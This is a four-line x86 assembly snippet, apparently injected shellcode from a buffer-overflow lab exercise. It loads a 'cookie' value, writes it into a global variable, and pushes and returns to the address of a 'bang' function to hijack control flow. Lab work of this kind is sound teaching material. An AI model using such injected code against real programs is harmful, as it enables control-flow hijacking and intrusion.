mov 0x804c1e4,%eax	# get the cookie value
mov %eax,0x804c1ec	# put the cookie value to globe_value
push $0x8048ceb		# push the bang entry address to the stack
ret			# return to the bang function
